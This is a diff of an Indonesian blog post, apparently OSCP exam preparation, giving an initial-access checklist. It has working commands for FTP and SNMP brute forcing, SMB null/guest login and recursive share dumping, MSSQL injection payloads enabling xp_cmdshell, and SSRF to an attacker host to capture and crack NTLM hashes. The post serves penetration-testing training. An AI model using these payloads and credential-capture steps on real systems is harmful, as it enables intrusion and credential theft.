@@ -9,18 +9,21 @@ image:
   path: /images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all.png
 ---
 
-Pada tanggal 10 Desember 2024 kemarin, saya memantapkan diri untuk mengambil ujian OSCP. Bisa dibilang agak mendadak, karena Course dan Challenge Lab saya baru jalan sekitar 50%-an. OSCP ini bisa dibilang sebagai "enumeration game" yang di mana untuk menemukan Initial Access saat ujian berlangsung tidak terlalu sulit.
+Pada tanggal 10 Desember 2024 kemarin, saya memantapkan diri untuk mengambil ujian OSCP. Bisa dibilang agak mendadak, karena Course dan Challenge Lab saya baru jalan sekitar 50%-an. OSCP ini bisa dibilang sebagai "Enumeration Game" yang di mana untuk menemukan Initial Access saat ujian berlangsung tidaklah terlalu sulit.
 
-Secara garis besar, maka hal apa saja yang perlu kalian ingat:
+Saya akan merangkum tantangan-tantangan yang mungkin kalian temui saat mencari Initial Access (saat exam OSCP nanti).
+
 - [X] [**FTP (21/tcp): Anonymous Login**](#ftp-anonymous-login)
 - [X] [**FTP (21/tcp): Brute Force Login with ftp-betterdefaultpasslist.txt**](#ftp-brute-force-login-with-ftp-betterdefaultpasslisttxt)
-- [X] **SNMP (161/udp): Public Community Strings**
-- [X] **SNMP (161/udp): Brute Force Community Strings**
-- [X] **SMB (445/tcp): Null Session Login**
-- [X] **SMB (445/tcp): Guest Login**
+- [X] [**SMB (445/tcp): Null Session Login**](#smb-null-session)
+- [X] [**SMB (445/tcp): Guest Login**](#smb-guest-login)
+- [X] [**SNMP (161/udp): Public Community Strings**](#snmp-public-community-string)
+- [X] [**SNMP (161/udp): Brute Force Community Strings**](#snmp-public-community-string)
 - [X] **Web Application (HTTP): Hidden Directories and Files Enumeration**
-- [X] **Web Application (HTTP): SQL Injection (MSSQL to Command Execution)**
-- [X] **Web Application (HTTP): Server-Side Request Forgery in Windows Server (Obtain NTLM)**
+- [X] [**Web Application (HTTP): SQL Injection (MSSQL to Command Execution)**](#web-application-sql-injection-mssql-to-command-execution)
+- [X] [**Web Application (HTTP): Server-Side Request Forgery in Windows Server (SSRF to Steal NTLM)**](#web-application-server-side-request-forgery-in-windows-server-steal-ntlm)
+
+## Port Scan
 
 Untuk melakukan inisiasi, biasanya kita perlu melakukan Port Scanning di awal. Namun, dalam kasus ini, saya tidak akan menggunakan NMAP karena waktu yang tersedia saat ujian OSCP sangat terbatas.
 
@@ -38,6 +41,8 @@ UDP:
 udpx -c 500 -w 1000 -t $TARGET
 ```
 
+----------
+
 ## FTP Anonymous Login
 
 Tool yang akan saya gunakan di sini adalah [NetExec](https://github.com/Pennyw0rth/NetExec).
@@ -47,101 +52,175 @@ Skenario yang dapat kita lakukan saat mendapatkan akses FTP Anonymous Login:
 - Write access: Kita dapat mengunggah file backdoor, untuk mendapatkan akses reverse shell.
 
 ```bash
-netexec ftp $TARGET -u 'anonymous' -p 'anonymous'
+netexec ftp <TARGET> -u 'anonymous' -p 'anonymous'
 ```
 
 ## FTP Brute Force Login with ftp-betterdefaultpasslist.txt
 
-Kemudian, yang keuda, pada service FTP kita dapat memanfaatkan Tool  dan Wordlist dari  untuk menemukan Credential yang valid.
-
 Selain itu, pada service FTP, kita dapat memanfaatkan tool [Hydra](https://www.kali.org/tools/hydra/) dan wordlist dari [ftp-betterdefaultpasslist.txt (SecLists)](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt) untuk menemukan kredensial yang valid.
 
 ```bash
-hydra -C /usr/share/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $TARGET ftp
+hydra -C /usr/share/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <TARGET> ftp
 ```
 
+----------
 
+## SMB Null Session
 
-
-
-
-
-
-
-
-
-
-
-## 3. SMB (445/tcp)
-
-Ada dua metode initial access yang dapat dicoba pada layanan SMB, yaitu "Null Session" dan "Guest Login".
-
-Untuk memeriksa service SMB, di sini saya menyarankan untuk menggunakan [NetExec](https://github.com/Pennyw0rth/NetExec).
-
-### SMB Null Session
+Untuk memeriksa apakah SMB dapat Login menggunakan Null Session (tanpa username dan password), di sini saya akan menggunakan tool [NetExec](https://github.com/Pennyw0rth/NetExec) (lagi).
 
 ```bash
 netexec smb <TARGET> -u '' -p ''
 ```
 
-### SMB Guest Login
+## SMB Guest Login
+
+Jika tidak dapat login dengan Null Session, kita perlu memeriksa apakah service SMB pada mesin target mengizinkan kita login menggunakan akun Guest.
 
 ```bash
-netexec smb <TARGET> -u 'guest' -p ''
+netexec smb <TARGET> -u 'guest' -p 'guest'
 ```
 
-### SMB Enumerate Local User
+> Enum4linux
 
-Dengan memanfaatkan 2 kerentanan tersebut biasanya kita bisa memperoleh beberapa Local User yang ada di dalam OS dengan menggunakan [enum4linux](https://www.kali.org/tools/enum4linux/).
+Jika salah satu metode login SMB di atas ada yang berhasil, maka kita dapat menggunakan tool [enum4linux](https://www.kali.org/tools/enum4linux/) untuk mempercepat proses enumerasi.
 
 ```bash
-# with null session
-enum4linux -a -v <TARGET>
-
-# with guest login
-enum4linux -u guest -p '' -a -v <TARGET>
-
-# with credential
-enum4linux -u <USERNAME> -p <PASSWORD> -a -v <TARGET>
+enum4linux -a -v $TARGET
+```
+```bash
+enum4linux -u 'guest' -p 'guest' -a -v <TARGET>
+```
+```bash
+enum4linux -u 'username' -p 'password' -a -v <TARGET>
 ```
 
 ![enum4linux SMB Users Enumeration](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-enum4linux-smb-users-enum.png)
 
-## 4. SNMP (161/udp)
+> Dump all files inside SMB
 
-Preparation:
+Jika menemukan Sharefolder yang mencurigakan, kita bisa langsung download semua file di dalam SMB secara recursive ke mesin kita.
+
 ```bash
+netexec smb <TARGET> -u 'username' -p 'password' -M spider_plus -o DOWNLOAD_FLAG=True
+```
+
+----------
+
+**SNMP (161/udp) Pentest Preparation**
+
+Tool yang akan digunakan adalah [net-snmp (snmpbulkwalk)](https://www.kali.org/tools/net-snmp/#snmp) beserta beberapa modul dan tool tambahan lainnya.
+
+```bash
+# Install SNMP Extender
 sudo apt-get install snmp-mibs-downloader -y
 sudo download-mibs
 ```
 
-Initial Access pada SNMP biasanya dilakukan untuk memperoleh kredensial yang tercatat di dalamnya. Dalam SNMP, kita menggunakan "community string" sebagai input (biasanya bernama "public").
+```bash
+# Install onesixtyone to brute force SNMP
+sudo apt update
+sudo apt install build-essential libpcap-dev
+git clone https://github.com/trailofbits/onesixtyone.git
+cd onesixtyone
+make
+sudo make install
+```
 
-### Get Info use Public Community String
+## SNMP Public Community String
+
+Initial Access pada SNMP biasanya dilakukan untuk memperoleh kredensial yang tercatat di dalamnya (logging). Dalam SNMP, kita akan menggunakan community string sebagai inputnya.
 
 ```bash
 snmpbulkwalk -c public -v2c <TARGET> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
 ```
 
-Namun, jika community string bernama "public" tidak tersedia, kita perlu melakukan Brute Force untuk menemukannya.
+- `-c public` adalah `public` community string.
 
-### Brute Force Community String
+![SNMPBulkWalk Public](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-snmpblukwalk-public.png)
 
-Terdapat dua wordlist umum yang dapat digunakan, yaitu SecLists atau Wordlist dari Metasploit Framework.
+## SNMP Community String Brute Force
+
+Jika community string "public"-nya tidak tersedia, maka kita perlu melakukan brute force pada community string-nya terlebih dahulu untuk menemukannya.
+
+Terdapat dua wordlist yang umum digunakan, yaitu SecLists atau Wordlist dari Metasploit Framework.
 
 ```bash
 onesixtyone -c /usr/share/SecLists/Discovery/SNMP/snmp.txt <TARGET>
-```
-
-```bash
 onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <TARGET>
 ```
 
-SNMP Walk menggunakan custom community string.
+Kemudian, snmpbulkwalk menggunakan custom community string.
 
 ```bash
 snmpbulkwalk -c <COMMUNITY_STRING_NAME> -v2c <TARGET> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
 ```
+
+----------
+
+## Web Application: SQL Injection (MSSQL to Command Execution)
+
+Pada dasarnya SQL Injection pada MSSQL memungkinkan kita untuk mengeksekusi Stacked Query, yang di mana kita dapat melakukan escape dengan cara menutup dan mengakhiri querynya dengan payload `';` dan menjalankan query lain.
+
+- `http://10.10.10.10/profile.aspx?id=1';EXEC xp_cmdshell "whoami";--`
+
+Enable `xp_cmdshell`:
+
+```sql
+';EXEC sp_configure 'show advanced options', 1;--
+';RECONFIGURE;--
+';EXEC sp_configure "xp_cmdshell", 1;--
+';RECONFIGURE;--
+```
+
+Execute `xp_cmdshell`"
+
+```
+';EXEC xp_cmdshell "whoami";--
+```
+
+## Web Application: Server-Side Request Forgery in Windows Server (Steal NTLM)
+
+Saya baru menyadari bahwa, celah SSRF (Server-Side Request Forgery) sangat berbahaya pada environment Windows. Yang di mana dapat dimanfaatkan untuk mencuri NTML Hash.
+
+Untuk mengeksekusinya, kita perlu menghidupkan [Responder](https://github.com/SpiderLabs/Responder) terlebih dahulu pada mesin kita.
+
+```bash
+sudo python3 Responder.py -I tun0 -wd
+```
+
+Kemudian mengeksekusi SSRF-nya dengan menggunakan URL `file://<ATTACKER_IP>/test` dan boom! Responder kalian akan menangkap Request seperti ini.
+
+![SSRF in Responder](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-ssrf-responder.png)
+
+Lalu, kalian hanya tinggal crack NTML-nya saja.
+
+```bash
+hashcat -m 5600 '<HASH>' /usr/share/wordlists/rockyou.txt
+```
+
+![SSRF NTLM Cracked](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-ssrf-responder-ntlm-cracked.png)
+
+
+
+
+
+
+
+
+
+
+# UNDER COSTRUCTION
+> THE WRITER STILL LAZY TO FIX THIS ARTICLE LOL!
+> THE WRITER STILL LAZY TO FIX THIS ARTICLE LOL!
+> THE WRITER STILL LAZY TO FIX THIS ARTICLE LOL!
+> THE WRITER STILL LAZY TO FIX THIS ARTICLE LOL!
+> THE WRITER STILL LAZY TO FIX THIS ARTICLE LOL!
+
+
+
+
+
 
 ## 5. Found Weird Port? (Uncommon Services)
 
@@ -180,42 +259,6 @@ Google it
 
 - Try `admin:admin`
 - or Google it: `<APPLICATION_NAME> default credentials`
-
-## 7. Web Application: SSRF to Steal NTLM
-
-Saya baru menyadari bahwa, celah SSRF (Server-Side Request Forgery) sangat berbahaya pada environment Windows. Yang di mana dapat dimanfaatkan untuk mencuri NTML Hash.
-
-Untuk mengeksekusinya, kita perlu menghidupkan [Responder](https://github.com/SpiderLabs/Responder) terlebih dahulu pada mesin kita.
-
-```bash
-sudo python3 Responder.py -I tun0 -wd
-```
-
-Kemudian mengeksekusi SSRF-nya dengan menggunakan URL `file://<ATTACKER_IP>/test` dan boom! Responder kalian akan menangkap Request seperti ini.
-
-![SSRF in Responder](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-ssrf-responder.png)
-
-Lalu, coba crack NTML-nya.
-
-## 8. Web Application: SQL Injection
-
-Karena SQL Injection pada MSSQL memungkinkan kita untuk mengeksekusi Stacked Query, kita dapat melakukan escape dan menjalankan query lain. Contohnya seperti ini:
-- `http://10.10.10.10/profile.aspx?id=1';EXEC xp_cmdshell "whoami";--`
-
-Enable "xp_cmdshell":
-
-```sql
-';EXEC sp_configure 'show advanced options', 1;--
-';RECONFIGURE;--
-';EXEC sp_configure "xp_cmdshell", 1;--
-';RECONFIGURE;--
-```
-
-Exec "xp_cmdshell":
-
-```
-';EXEC xp_cmdshell "whoami";--
-```
 
 ## 9. Found Numerous Unnecessary Files?
 
@@ -269,8 +312,3 @@ Download file recursively.
 wget -m --user='<USERNAME>' --password='<PASSWORD>' ftp://<TARGET> --no-passive-ftp
 ```
 
-Download semua file di dalam SMB secara recursive.
-
-```bash
-nxc smb <TARGET> -u '<USERNAME>' -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=True
-```
